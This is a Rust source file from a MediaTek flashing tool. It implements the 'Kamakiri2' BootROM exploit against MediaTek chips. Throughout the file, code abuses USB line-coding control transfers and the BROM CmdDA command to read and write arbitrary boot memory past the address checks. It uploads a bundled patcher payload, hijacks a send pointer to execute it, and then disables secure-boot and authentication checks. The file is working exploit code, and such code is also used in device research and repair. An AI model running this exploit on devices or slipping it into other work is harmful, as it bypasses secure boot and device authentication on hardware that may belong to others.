/*
    SPDX-License-Identifier: AGPL-3.0-or-later
    SPDX-FileCopyrightText: 2025 Shomy

    Implementation details studied from: https://github.com/R0rt1z2/kamakiri/tree/mt8516-cupcake
    Original work from chaosmaster (k4y0z) and xyzz, under the MIT License.
    Credits also go to Chimera team for discovering the linecode exploit.

    Thanks as well to bkerler for the original generic patcher implementation in mtkclient,
    which inspired Penumbra's secpatcher.
*/

use async_trait::async_trait;
use log::{debug, info};

use crate::connection::Connection;
use crate::connection::port::{ConnectionType, MTKPort};
use crate::da::{DA, DAProtocol};
use crate::error::{Error, Result};
use crate::exploit::{BootStage, Exploit, ExploitMeta};

const KAMAKIRI_PAYLOAD: &[u8] = include_bytes!("../../payloads/kksecpatcher.bin");
const KAMAKIRI_PAYLOAD_MAGIC: &[u8] = b"PENUMBRAKK";
const PAYLOAD_HEADER_SIZE: usize = 24;
const ENTRY_SIZE: usize = 16;
const PAYLOAD_ADDR: u32 = 0x100A00;
const PAYLOAD_MAGIC: &[u8] = &[0xA1, 0xA2, 0xA3, 0xA4];
const HANDSHAKE_SEQ: &[u8] = &[0xA0, 0x0A, 0x50, 0x05];

#[derive(Clone, Copy)]
enum CmdDaDirection {
    FromDevice,
    ToDevice,
}

struct KamakiriPayload {
    payload: Vec<u8>,
    ptr_da: u32,
    ptr_usbdl: u32,
    wdt_addr: u32,
}

struct DaRwParams<'a> {
    direction: CmdDaDirection,
    address: u32,
    data: Option<&'a [u8]>,
    length: usize,
    check_status: bool,
}

// TODO: Patch DA
#[allow(dead_code)]
pub struct Kamakiri2 {
    meta: ExploitMeta,
    patched_da: Option<DA>,
}

impl Default for Kamakiri2 {
    fn default() -> Self {
        Self::new()
    }
}

impl Kamakiri2 {
    pub fn new() -> Self {
        Self {
            meta: ExploitMeta {
                name: String::from("Kamakiri2"),
                boot_mode: vec![ConnectionType::Brom],
                boot_stage: BootStage::Brom,
            },
            patched_da: None,
        }
    }

    fn get_payload(&self, hw_code: u16) -> Option<KamakiriPayload> {
        let data = KAMAKIRI_PAYLOAD;

        if &data[0..10] != KAMAKIRI_PAYLOAD_MAGIC || data.len() < PAYLOAD_HEADER_SIZE {
            return None;
        }

        let num_entries = self.read_u32(data, 12) as usize;
        let payload_offset = self.read_u32(data, 16) as usize;
        let payload_size = self.read_u32(data, 20) as usize;

        let matched_entry = self.find_hw_entry(data, num_entries, hw_code as u32)?;
        let payload = data[payload_offset..payload_offset + payload_size].to_vec();

        Some(KamakiriPayload {
            payload,
            ptr_da: matched_entry.3,
            ptr_usbdl: matched_entry.2,
            wdt_addr: matched_entry.1,
        })
    }

    fn read_u32(&self, data: &[u8], offset: usize) -> u32 {
        u32::from_le_bytes(data[offset..offset + 4].try_into().unwrap())
    }

    fn find_hw_entry(
        &self,
        data: &[u8],
        num_entries: usize,
        target_hw: u32,
    ) -> Option<(u32, u32, u32, u32)> {
        for i in 0..num_entries {
            let base = PAYLOAD_HEADER_SIZE + i * ENTRY_SIZE;
            let hw = self.read_u32(data, base);
            let wdt = self.read_u32(data, base + 4);
            let ptr_usbdl = self.read_u32(data, base + 8);
            let ptr_da = self.read_u32(data, base + 12);

            if hw == target_hw {
                debug!(
                    "Kamakiri Entry: HW=0x{:08X}, WDT=0x{:08X}, USBDL=0x{:08X}, DA=0x{:08X}",
                    hw, wdt, ptr_usbdl, ptr_da
                );
                return Some((hw, wdt, ptr_usbdl, ptr_da));
            }
        }
        None
    }

    async fn ctrl_sequence(
        &self,
        port: &mut dyn MTKPort,
        linecoding: &[u8],
        val: u32,
    ) -> Result<()> {
        let mut v = [0u8; 16];
        v[..linecoding.len()].copy_from_slice(linecoding);
        v[linecoding.len()..linecoding.len() + 4].copy_from_slice(&val.to_le_bytes());
        port.ctrl_out(0x21, 0x20, 0, 0, &v).await?;
        port.ctrl_in(0x80, 0x06, 0x0200, 0, 9).await?;
        Ok(())
    }

    /// Read and Write BROM registers via Cmd 0xDA (BROM only)
    async fn cmd_da(
        &self,
        protocol: &mut dyn DAProtocol,
        direction: CmdDaDirection,
        length: usize,
        offset: usize,
        data: Option<&[u8]>,
        check_status: bool,
    ) -> Result<Vec<u8>> {
        let conn = protocol.get_connection();

        // Format as BE, or for some reason penumbra sends it wrong
        conn.echo(&[0xDA], 1).await?;
        conn.echo(&(direction as u32).to_be_bytes(), 4).await?;
        conn.echo(&(offset as u32).to_be_bytes(), 4).await?;
        conn.echo(&(length as u32).to_be_bytes(), 4).await?;

        self.check_status(conn).await?;

        match direction {
            CmdDaDirection::ToDevice => {
                if data.is_none() {
                    return Err(Error::conn("No data provided for CmdDA ToDevice"));
                }

                conn.port.write_all(data.unwrap()).await?;
            }
            CmdDaDirection::FromDevice => {
                let mut buffer = vec![0u8; length];
                conn.port.read_exact(&mut buffer).await?;
                if check_status {
                    self.check_status(conn).await?;
                }
                return Ok(buffer);
            }
        }

        if check_status {
            self.check_status(conn).await?;
        }

        Ok(vec![])
    }

    async fn check_status(&self, conn: &mut Connection) -> Result<()> {
        let mut status = [0u8; 2];
        conn.port.read_exact(&mut status).await?;
        if status != [0, 0] {
            return Err(Error::conn("CmdDA command failed at status stage"));
        }
        Ok(())
    }

    /// Abusing the linecode exploit, it allows reading/writing arbitrary BROM memory via CmdDA,
    /// bypassing the usual address checks.
    async fn da_rw(
        &self,
        protocol: &mut dyn DAProtocol,
        payload: &KamakiriPayload,
        linecode: &[u8],
        params: DaRwParams<'_>,
    ) -> Result<Vec<u8>> {
        let _ = self.cmd_da(protocol, CmdDaDirection::FromDevice, 1, 0, None, true).await;

        let conn = protocol.get_connection();
        conn.read32(payload.wdt_addr + 0x50, 1).await.ok();

        for i in 0..3 {
            self.ctrl_sequence(conn.port.as_mut(), linecode, payload.ptr_da + 5 + i).await?;
        }

        let da_addr = if params.address < 0x40 {
            for i in 0..4 {
                let ptr = payload.ptr_da - 6 + (4 - i as u32);
                self.ctrl_sequence(conn.port.as_mut(), linecode, ptr).await?;
            }
            params.address as usize
        } else {
            for i in 0..3 {
                let ptr = payload.ptr_da - 5 + (3 - i as u32);
                self.ctrl_sequence(conn.port.as_mut(), linecode, ptr).await?;
            }
            (params.address as usize) - 0x40
        };

        self.cmd_da(
            protocol,
            params.direction,
            params.length,
            da_addr,
            params.data,
            params.check_status,
        )
        .await
    }

    /// Validate the payload ACK
    async fn validate_magic(&self, port: &mut dyn MTKPort) -> Result<()> {
        let mut buf = [0u8; 4];
        port.read_exact(&mut buf).await?;
        if buf != PAYLOAD_MAGIC {
            return Err(Error::conn(format!(
                "Kamakiri: wrong magic {:02X? }, expected {:02X?}",
                buf, PAYLOAD_MAGIC
            )));
        }
        Ok(())
    }

    /// Handshake with the payload to ensure it's running properly
    // TODO: See if this can be replacdd with port.handshake()
    async fn handshake(&self, port: &mut dyn MTKPort) -> Result<()> {
        let mut reply = [0u8; 1];
        for &b in HANDSHAKE_SEQ {
            port.write_all(&[b]).await?;
            port.read_exact(&mut reply).await?;
            let expected = !b;
            if reply[0] != expected {
                return Err(Error::conn(format!(
                    "HSK byte mismatch: sent {:02X}, got {:02X}, expected {:02X}",
                    b, reply[0], expected
                )));
            }
        }
        Ok(())
    }
}

#[async_trait]
impl Exploit for Kamakiri2 {
    async fn run(&mut self, protocol: &mut dyn DAProtocol) -> Result<bool> {
        if protocol.get_connection().connection_type != ConnectionType::Brom {
            return Ok(false);
        }

        let hw_code = protocol.get_connection().get_hw_code().await?;
        debug!("[Exploit] Detected HW code: 0x{:04X}", hw_code);

        let payload = self
            .get_payload(hw_code)
            .ok_or_else(|| Error::penumbra("No Kamakiri payload found for this HW code"))?;

        info!("[Exploit] Device is vulnerable to Kamakiri, exploiting...");
        debug!("[Exploit] Kamakiri2 payload found for HW code 0x{:04X}", hw_code);

        let mut linecode = protocol.get_connection().port.ctrl_in(0xA1, 0x21, 0, 0, 7).await?;
        linecode.push(0); // Align
        debug!("[Exploit] Retrieved line coding from device: {:02X? }", linecode);

        let resp = self
            .da_rw(protocol, &payload, &linecode, DaRwParams {
                direction: CmdDaDirection::FromDevice,
                address: payload.ptr_usbdl,
                data: None,
                length: 4,
                check_status: true,
            })
            .await?;

        let ptr_send = u32::from_le_bytes(resp[..4].try_into().unwrap()) + 8;

        self.da_rw(protocol, &payload, &linecode, DaRwParams {
            direction: CmdDaDirection::ToDevice,
            address: PAYLOAD_ADDR,
            data: Some(&payload.payload),
            length: payload.payload.len(),
            check_status: true,
        })
        .await?;

        self.da_rw(protocol, &payload, &linecode, DaRwParams {
            direction: CmdDaDirection::ToDevice,
            address: ptr_send,
            data: Some(&PAYLOAD_ADDR.to_le_bytes()),
            length: 4,
            check_status: false,
        })
        .await?;

        let conn = protocol.get_connection();
        // Ack before patching
        self.validate_magic(conn.port.as_mut()).await?;
        // Ack after patching
        self.validate_magic(conn.port.as_mut()).await?;
        // Final handshake
        self.handshake(conn.port.as_mut()).await?;

        debug!("[Exploit] Handshake with Kamakiri2 payload successful!");
        debug!("[Exploit] Target config after exploit:");

        // We print the target config bits both for debugging, as well to ensure
        // the payload returned to the cmd_handler loop properly.
        let target_config = protocol.get_connection().get_target_config().await?;
        debug!("SBC: {}", target_config & 0x1 != 0);
        debug!("SLA: {}", target_config & 0x2 != 0);
        debug!("DAA: {}", target_config & 0x4 != 0);

        protocol.get_devinfo().set_target_config(target_config).await;

        self.patched_da = protocol.patch_da();

        info!("[Exploit] Kamakiri2 done!");
        Ok(true)
    }

    fn get_meta(&self) -> &ExploitMeta {
        &self.meta
    }

    fn get_patched_da(&self) -> Option<DA> {
        self.patched_da.clone()
    }
}
